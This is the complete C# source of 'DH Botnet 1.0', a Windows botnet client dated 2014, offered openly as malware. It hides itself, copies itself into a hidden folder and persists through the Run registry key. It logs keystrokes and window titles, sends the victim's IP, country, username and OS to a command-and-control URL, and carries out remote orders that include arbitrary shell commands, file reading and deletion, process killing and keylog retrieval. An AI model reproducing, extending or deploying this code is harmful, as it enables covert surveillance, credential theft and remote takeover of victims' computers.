// DH Botnet 1.0
// (C) Doddy Hackman 2014
// Credits : 
// Open & Close CD : http://www.codeproject.com/Articles/9396/Open-and-Close-CD-drive-in-C
// Hide & Show Taskbar : http://social.msdn.microsoft.com/Forums/vstudio/en-US/e231f5be-5233-4eee-b142-7aef50f37287/disabling-andor-hiding-windows-taskbar
// Hide & Show desktop icons : http://stackoverflow.com/questions/13664903/show-hide-desktop-c-sharp

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Text.RegularExpressions;

namespace Stub
{
    public partial class Form1 : Form
    {

        // Vars Global

        string datos = "";
        string clave = "";
        string ip = "";
        string pais = "";
        string user = "";
        string os = "";
        string url_master = "";
        string time = "";
        string code = "";
        string ordenes_re = "";
        string ordenes_cmd = "";
        string ordenes_ar1 = "";
        string ordenes_ar2 = "";
        string ordenes_ar3 = "";

        string nombre1 = ""; // Declaramos la variable string nombre1 como vacia ("")
        string nombre2 = ""; // Declaramos  la variable string nombre2 como vacia ("")

        // DLL to Keylogger

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Int32 teclas);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr ventana, StringBuilder cadena, int cantidad);

        // DLL to open & close CD

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        public static extern void mciSendStringA(string comandonow,string retornonow, long longitudnow, long callbacknow);

        //

        //DLL to hide & show taskbar

        [DllImport("user32.dll")]
        public static extern int FindWindow(string clasenow, string textonow);

        //

        // DLL to hide & show desktop icons

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr vennownow, int comandonow);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hannow, IntPtr nenow, string clasclasnow, string titulovenganow);
        //

        // DLL to move mouse

        [DllImport("user32.dll", CallingConvention = CallingConvention.StdCall)]
        static extern void SetCursorPos(int X, int Y);

        //

        public Form1()
        {
            InitializeComponent();

            this.WindowState = FormWindowState.Minimized;
            //this.ShowInTaskbar = false;
            this.Visible = false;

        }

        // Functions

        public void savefile(string file, string texto)
        {
            try
            {
                System.IO.StreamWriter save = new System.IO.StreamWriter(file, true);
                save.Write(texto);
                save.Close();
            }
            catch
            {
                //
            }
        }

        public void cmd_normal(string command)
        {
            try
            {
                System.Diagnostics.Process.Start("cmd", "/c " + command);
            }
            catch
            {
                //
            }
        }

        public void cmd_hide(string command)
        {
            try
            {
                ProcessStartInfo cmd_now = new ProcessStartInfo("cmd", "/c " + command);
                cmd_now.RedirectStandardOutput = false;
                cmd_now.WindowStyle = ProcessWindowStyle.Hidden;
                cmd_now.UseShellExecute = true;
                Process.Start(cmd_now);
            }
            catch
            {
                //
            }
        }

        public string open_cd()
        {
            string resultado = "";
            try
            {
                mciSendStringA("set CDAudio door open", "", 127, 0);
                resultado = "[?] Open CD : OK";
            }
            catch
            {
                resultado = "[?] Open CD : FAIL";
            }
            return resultado;
        }

        public string close_cd()
        {
            string resultado = "";
            try
            {
                mciSendStringA("set CDAudio door closed", "", 127, 0);
                resultado = "[?] Close CD : OK";
            }
            catch
            {
                resultado = "[?] Close CD : FAIL";
            }
            return resultado;
        }

        public string hide_taskbar()
        {
            string resultado = "";

            try
            {
                int calculando_int = FindWindow("Shell_TrayWnd", "");
                IntPtr valor_final = new IntPtr(calculando_int);
                ShowWindow(valor_final,0);
                resultado = "[?] Hide Taskbar : OK";
            }
            catch
            {
                resultado = "[?] Hide Taskbar : FAIL";
            }

            return resultado;
        }

        public string show_taskbar()
        {
            string resultado = "";

            try
            {
                int calculando_int = FindWindow("Shell_TrayWnd", "");
                IntPtr valor_final = new IntPtr(calculando_int);
                ShowWindow(valor_final, 1);
                resultado = "[?] Show Taskbar : OK";
            }
            catch
            {
                resultado = "[?] Show Taskbar : FAIL";

            }

            return resultado;
        }

        public string hide_icons()
        {
            string resultado = "";

            try
            {
                IntPtr calculando_int = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
                ShowWindow(calculando_int,0);
                resultado = "[?] Hide Icons : OK";
            }
            catch
            {
                resultado = "[?] Hide Icons : FAIL";
            }

            return resultado;
        }

        public string show_icons()
        {
            string resultado = "";
            try
            {
                IntPtr calculando_int = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
                ShowWindow(calculando_int, 1);
                resultado = "[?] Show Icons : OK";
            }
            catch
            {
                resultado = "[?] Show Icons : FAIL";
            }
            return resultado;
        }

        public string send_keys(string texto)
        {
            string resultado = "";

            try
            {
                SendKeys.Send(texto);
                resultado = "[?] SendKeys : OK";
            }
            catch
            {
                resultado = "[?] SendKeys : FAIL";
            }

            return resultado;
        }

        public string open_word(string texto)
        {
            string resultado = "";

            try
            {
                cmd_normal("start winword.exe");
                System.Threading.Thread.Sleep(5000);
                send_keys(texto);
                resultado = "[?] OpenWord : OK";
            }
            catch
            {
                resultado = "[?] OpenWord : FAIL";
            }

            return resultado;
        }

        public string readfile(string file)
        {
            string resultado = "";
            try
            {
                resultado = "[?] Read File : OK\n\n";
                resultado = resultado + "[Source Start]\n";
                resultado = resultado + System.IO.File.ReadAllText(file);
                resultado = resultado + "\n[Source End]\n";
            }
            catch
            {
                resultado = "[?] Read File : FAIL";
            }
            return resultado;
        }

        public string console(string cmd)
        {

            string resultado = "";

            try
            {
                resultado = "[?] Command : OK\n\n";
                System.Diagnostics.ProcessStartInfo loadnow = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
                loadnow.RedirectStandardOutput = true;
                loadnow.UseShellExecute = false;
                loadnow.CreateNoWindow = true;
                System.Diagnostics.Process loadnownow = new System.Diagnostics.Process();
                loadnownow.StartInfo = loadnow;
                loadnownow.Start();
                resultado = resultado + "[Source Start]\n";
                resultado = resultado + loadnownow.StandardOutput.ReadToEnd();
                resultado = resultado + "\n[Source End]\n";
                

            }

            catch
            {
                resultado = "[?] Command : FAIL";
            }

            return resultado;

        }

        public string listar_directorio(string path)
        {
            string resultado = "";
            string directorio = path;

            try
            {

                resultado = "[?] List Directory : OK\n\n";

                List<string> directorios_encontrados = new List<string> { };

                string[] buscando_directorios = System.IO.Directory.GetDirectories(directorio);

                foreach (string directorios in buscando_directorios)
                {
                    directorios_encontrados.Add(directorios);
                }

                List<string> archivos_encontrados = new List<string> { };

                string[] abriendo_archivos = System.IO.Directory.GetFiles(directorio);

                foreach (string archivos in abriendo_archivos)
                {
                    archivos_encontrados.Add(archivos);
                }

                resultado = resultado + "[+] Directory Founds : " + directorios_encontrados.Count + "\n\n";

                foreach (string dirs in directorios_encontrados)
                {
                    resultado = resultado + "[+] Directory : " + dirs + "\n";
                }

                resultado = resultado + "\n[+] Files Found : " + archivos_encontrados.Count + "\n\n";

                foreach (string files in archivos_encontrados)
                {
                    resultado = resultado + "[+] File : " + files + "\n";
                }

            }
            catch
            {
                resultado = "[?] List Directory : FAIL";
            }

            return resultado;
        }

        public string listar_procesos()
        {
            string resultado = "";
            try
            {
                resultado = resultado + "[?] Get Proccess : OK\n\n";
                Process[] process_encontrados = Process.GetProcesses();

                resultado = resultado + "[Process Found] : " + process_encontrados.Length + "\n\n";

                foreach (Process process_found in process_encontrados)
                {
                    resultado = resultado + "[Process Name] : " + process_found.ProcessName + "\n";
                    resultado = resultado + "[PID] : " + process_found.Id + "\n";
                }
            }
            catch
            {
                resultado = "[?] Get Proccess : FAIL";
            }
            return resultado;
        }

        public string matar_proceso(string nombre)  
        {
            string resultado = "";
            try
            {
                resultado = "[?] Kill Process : OK";
                Process[] kill_process = Process.GetProcessesByName(nombre);
                foreach (Process die in kill_process)
                {
                    die.Kill();
                }
            }
            catch
            {
                resultado = "[?] Kill Proccess : FAIL";
            }
            return resultado;
        }

        public string eliminar_esto(string path)
        {
            string resultado = "";

            if (File.Exists(path))
            {
                try
                {
                    File.Delete(path);
                    resultado = resultado + "[?] File Deleted : OK";
                }
                catch
                {
                    resultado = resultado + "[?] File Deleted : FAIL";
                }
            }

            if (Directory.Exists(path))
            {
                try
                {
                    string[] archivos_encontrados = Directory.GetFiles(path);
                    foreach (string archivo_a_borrar in archivos_encontrados)
                    {
                        File.Delete(archivo_a_borrar);
                    }

                    Directory.Delete(path);
                    resultado = resultado + "[?] Directory Deleted : OK";
                }
                catch
                {
                    resultado = resultado + "[?] Directory Deleted : FAIL";
                }
            }

            return resultado;
        }

        public string crazy_mouse(string tiempo)
        {
            string resultado = "";
            try
            {
                for (int posicion_mouse = 0; posicion_mouse < Convert.ToInt32(tiempo); posicion_mouse++)
                {
                    System.Threading.Thread.Sleep(1000);
                    SetCursorPos(posicion_mouse, posicion_mouse);
                }
                resultado = "[?] Crazy Mouse : OK";
            }
            catch
            {
                resultado = "[?] Crazy Mouse : FAIL";
            }

            return resultado;
        }

        public string dh_generate(int cantidad)
        {

            // Based on : http://stackoverflow.com/questions/54991/generating-random-passwords
            // Thanks to Radu094

            string letrasynumeros = "doddyhackmanwashere123456789";
            string password_gen = "";
            Random randomnow = new Random();
            for (int num = 0; num < cantidad; num++)
            {
                password_gen = password_gen + letrasynumeros[randomnow.Next(letrasynumeros.Length)];
            }
            return Convert.ToString(password_gen);
        }

        public string getmydata()
        {
            string resultado = "";

            string consegui_key = "";
            string consegui_ip = "";
            string consegui_pais = "";
            string consegui_user = "";
            string consegui_os = "";

            DH_Tools tools = new DH_Tools();

            try
            {
                consegui_key = tools.openword("key");
            }
            catch
            {
                consegui_key = "?";
            }

            string code = tools.toma("http://whatismyipaddress.com/");

            Match regex = Regex.Match(code, "Click for more about (.*)\"", RegexOptions.IgnoreCase);
            if (regex.Success)
            {
                consegui_ip = regex.Groups[1].Value;
            } else {
                consegui_ip = "?";
            }

            regex = Regex.Match(code, "Country:</th><td style=\"font-size:14px;\">(.*)</td></tr>", RegexOptions.IgnoreCase);
            if (regex.Success)
            {
                consegui_pais = regex.Groups[1].Value;
            }
            else
            {
                consegui_pais = "?";
            }

            try
            {
                consegui_user = System.Environment.UserName;
            }
            catch
            {
                consegui_user = "?";
            }

            try
            {
                consegui_os = Environment.OSVersion.ToString();
            }
            catch
            {
                consegui_os = "?";
            }

            resultado = clean_error_regex("[key]" + consegui_key + "[key]" + "[ip]" + consegui_ip + "[ip]" +
            "[pais]" + consegui_pais + "[pais]" + "[user]" + consegui_user + "[user]" +
            "[os]" + consegui_os + "[os]");

            return resultado;
        }

        public void saludo()
        {
              DH_Tools tools = new DH_Tools();
              tools.tomar(url_master, "entradatrasera=hidad&key=" + clave + "&ip=" + ip + "&pais="
              + pais + "&username=" + user + "&os=" + os + "&timeout=" + time);
        }

        public void sigo_vivo()
        {
            DH_Tools tools = new DH_Tools();
            tools.tomar(url_master, "sigovivo=alpedo&clavenow=" + clave);
        }

        public string ver_ordenes()
        {
            string resultado = "";

            string re_cmd = "";
            string arg1 = "";
            string arg2 = "";
            string arg3 = "";

            DH_Tools tools = new DH_Tools();

            string code = tools.tomar(url_master, "ordenespabots=alpedo&clave=" + clave);

            Match regex = Regex.Match(code, "Orden : (.*?)<br>", RegexOptions.IgnoreCase);
            if (regex.Success)
            {
                re_cmd = regex.Groups[1].Value;
            }

            regex = Regex.Match(code, "Arg1 : (.*?)<br>", RegexOptions.IgnoreCase);
            if (regex.Success)

            {
                arg1 = regex.Groups[1].Value;
            }

            regex = Regex.Match(code, "Arg2 : (.*?)<br>", RegexOptions.IgnoreCase);
            if (regex.Success)
            {
                arg2 = regex.Groups[1].Value;
            }

            regex = Regex.Match(code, "Arg3 : (.*?)<br>", RegexOptions.IgnoreCase);
            if (regex.Success)
            {
                arg3 = regex.Groups[1].Value;
            }

            resultado = clean_error_regex("[comando]" + re_cmd + "[comando]" + "[arg1]" + arg1 + "[arg1]" +
            "[arg2]" + arg2 + "[arg2]" + "[arg3]" + arg3 + "[arg3]");

            return resultado;
        }

        public void mandar_rta(string contenido)
        {
            DH_Tools tools = new DH_Tools();
            tools.tomar(url_master, "mandocarajo=alpedo&miclave=" + clave + "&mirta=" +contenido);
        }

        public string clean_error_regex(string text)
        {
            string resultado = "";

            resultado = text;
            resultado = resultado.Replace("[", "-");
            resultado = resultado.Replace("]", "-");

            return resultado;
        }

        // End

        private void Form1_Load(object sender, EventArgs e)
        {

            this.Hide();
            
            DH_Tools tools = new DH_Tools();

            load_config config = new load_config();
            config.load_data();
            //MessageBox.Show(config.get_data());

            string botnet_online = config.botnet_online;

            if (botnet_online == "1")
            {
                
                //MessageBox.Show("Botnet Online");

                url_master = config.pagina;
                time = config.timeout;

                // Configuracion Inicial

                string directorio_final = Environment.GetEnvironmentVariable("USERPROFILE")+"/tentob/";

                string ruta_botnet_inicial = Application.ExecutablePath;

                string rutadondeestoy = System.Reflection.Assembly.GetEntryAssembly().Location;
                string nombredondestoy = Path.GetFileName(rutadondeestoy);

                string ruta_botnet_final = directorio_final + nombredondestoy;

                if (!Directory.Exists(directorio_final))
                {
                    Directory.CreateDirectory(directorio_final);
                    File.SetAttributes(directorio_final, FileAttributes.Hidden);
                }
                else
                {
                    File.SetAttributes(directorio_final, FileAttributes.Hidden);
                }

                Directory.SetCurrentDirectory(directorio_final);

                try
                {
                    File.Copy(ruta_botnet_inicial, ruta_botnet_final);
                    File.SetAttributes(ruta_botnet_final, FileAttributes.Hidden);
                }
                catch
                {
                    //
                }

                if (!File.Exists("key"))
                {
                    tools.savefile("key", dh_generate(5));
                    File.SetAttributes("key", FileAttributes.Hidden);
                }
                else
                {
                    File.SetAttributes("key", FileAttributes.Hidden);
                }

                if (!File.Exists(directorio_final + "logs.out"))
                {
                    tools.savefile("logs.out", "");
                    File.SetAttributes("logs.out", FileAttributes.Hidden);
                }

                try
                {

                    RegistryKey loadnow = Registry.LocalMachine;
                    loadnow = loadnow.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    loadnow.SetValue("uberkkkk", ruta_botnet_final, RegistryValueKind.String);
                    loadnow.Close();

                }

                catch
                {
                    //
                }

                // Fin de configuracion inicial 

                string datos = getmydata();

                Match regex = Regex.Match(datos,"-key-(.*?)-key-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    clave = regex.Groups[1].Value;
                }

                regex = Regex.Match(datos, "-ip-(.*?)-ip-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    ip = regex.Groups[1].Value;
                }

                regex = Regex.Match(datos, "-pais-(.*?)-pais-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    pais = regex.Groups[1].Value;
                }

                regex = Regex.Match(datos, "-user-(.*?)-user-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    user = regex.Groups[1].Value;
                }

                regex = Regex.Match(datos, "-os-(.*?)-os-", RegexOptions.IgnoreCase);
                if (regex.Success)
                {
                    os = regex.Groups[1].Value;
                }

                saludo();

                panelcontrol.Interval = Convert.ToInt32(time) * 1000;
                panelcontrol.Enabled = true;

                capturar_teclas.Interval = 50;
                capturar_teclas.Enabled = true;

                capturar_ventanas.Interval = 10;
                capturar_ventanas.Enabled = true;

            }
            else
            {
                MessageBox.Show("Botnet Offline");
                Application.Exit();
            }
        }

        private void panelcontrol_Tick(object sender, EventArgs e)
        {
            sigo_vivo();

            string ordenes_re = clean_error_regex(ver_ordenes());

            Match regex = Regex.Match(ordenes_re, "-comando-(.*)-comando-", RegexOptions.IgnoreCase);
            if (regex.Success)
            {
                ordenes_cmd = regex.Groups[1].Value;
            }
            regex = Regex.Match(ordenes_re, "-arg1-(.*)-arg1-", RegexOptions.IgnoreCase);
            if (regex.Success)
            {
                ordenes_ar1 = regex.Groups[1].Value;
            }
            regex = Regex.Match(ordenes_re, "-arg2-(.*)-arg2-", RegexOptions.IgnoreCase);
            if (regex.Success)
            {
                ordenes_ar2 = regex.Groups[1].Value;
            }
            regex = Regex.Match(ordenes_re, "-arg3-(.*)-arg3-", RegexOptions.IgnoreCase);
            if (regex.Success)
            {
                ordenes_ar3 = regex.Groups[1].Value;
            }

            // Functions Botnet

            if (ordenes_cmd == "CMD")
            {
                mandar_rta(console(ordenes_ar1));
            }

            if (ordenes_cmd == "GetProcess")
            {
                mandar_rta(listar_procesos());
            }

            if (ordenes_cmd == "KillProcess")
            {
                mandar_rta(matar_proceso(ordenes_ar1));
            }

            if (ordenes_cmd == "ListDir")
            {
                mandar_rta(listar_directorio(ordenes_ar1));
            }

            if (ordenes_cmd == "Delete")
            {
                mandar_rta(eliminar_esto(ordenes_ar1));
            }

            if (ordenes_cmd == "OpenFile")
            {
                mandar_rta(readfile(ordenes_ar1));
            }

            if (ordenes_cmd == "OpenCD")
            {
                mandar_rta(open_cd());
            }

            if (ordenes_cmd == "CloseCD")
            {
                mandar_rta(close_cd());
            }

            if (ordenes_cmd == "HideIcons")
            {
                mandar_rta(hide_icons());
            }

            if (ordenes_cmd == "ShowIcons")
            {
                mandar_rta(show_icons());
            }

            if (ordenes_cmd == "HideTaskbar")
            {
                mandar_rta(hide_taskbar());
            }

            if (ordenes_cmd == "ShowTaskbar")
            {
                mandar_rta(show_taskbar());
            }

            if (ordenes_cmd == "SendKeys")
            {
                mandar_rta(send_keys(ordenes_ar1));
            }

            if (ordenes_cmd == "OpenWord")
            {
                mandar_rta(open_word(ordenes_ar1));
            }

            if (ordenes_cmd == "CrazyMouse")
            {
                mandar_rta(crazy_mouse(ordenes_ar1));
            }

            if (ordenes_cmd == "ReadLogsKeylogger")
            {
                mandar_rta(readfile("logs.out"));
            }

  
            // Fin de funciones Botnet

        }

        private void capturar_teclas_Tick(object sender, EventArgs e)
        {
            // Keylogger Based on http://www.blackstuff.net/f44/c-keylogger-4848/
            // Thanks to Carlos Raposo 

            List<string> teclas_izquierdas_numero = new List<string> { "96", "97", "98", "99", "100", "101", "102", "103", "104", "105" };
            List<string> teclas_izquierdas_valor = new List<string> { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" };

            for (int numcontrolnumizquierda = 0; numcontrolnumizquierda < teclas_izquierdas_numero.Count; numcontrolnumizquierda++)
            {
                int numeros_izquierda_control = GetAsyncKeyState(Convert.ToInt16(teclas_izquierdas_numero[numcontrolnumizquierda]));
                if (numeros_izquierda_control == -32767)
                {
                    savefile("logs.out", teclas_izquierdas_valor[numcontrolnumizquierda]);
                }
            }

            for (int num = 0; num <= 255; num++)
            {
                int numcontrol = GetAsyncKeyState(num);
                if (numcontrol == -32767)
                {

                    if (num >= 65 && num <= 122)
                    {
                        if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.CapsLock)))
                        {
                            string letra = Convert.ToChar(num + 32).ToString();
                            savefile("logs.out", letra);
                        }
                        else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)))
                        {
                            string letra = Convert.ToChar(num).ToString();
                            savefile("logs.out", letra);
                        }
                        else if (Convert.ToBoolean(GetKeyState(Keys.CapsLock)))
                        {
                            string letra = Convert.ToChar(num).ToString();
                            savefile("logs.out", letra);

                        }
                        else
                        {
                            string letra = Convert.ToChar(num + 32).ToString();
                            savefile("logs.out", letra);
                        }
                    }
                    else if (num >= 48 && num <= 57) 
                    {
                        if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey))) 
                        {
                            string letra = Convert.ToChar(num - 16).ToString();
                            savefile("logs.out", letra);
                        }
                        else 
                        {
                            string letra = Convert.ToChar(num).ToString();
                            savefile("logs.out", letra);
                        }
                    }
                    else
                    {
                        string letra_rara = Enum.GetName(typeof(Keys), num);
                        savefile("logs.out", "[" + letra_rara + "]");
                    }
                }
            }

        }

        private void capturar_ventanas_Tick(object sender, EventArgs e)
        {
            const int limite = 256;
            StringBuilder buffer = new StringBuilder(limite); 
            IntPtr manager = GetForegroundWindow();

            if (GetWindowText(manager, buffer, limite) > 0) 
            {
                nombre1 = buffer.ToString(); 

                if (nombre1 != nombre2) 
                {
                    nombre2 = nombre1; 
                    savefile("logs.out", "\n[" + nombre2 + "]\n"); 
                }
            }
        }
    }
}

// The End ?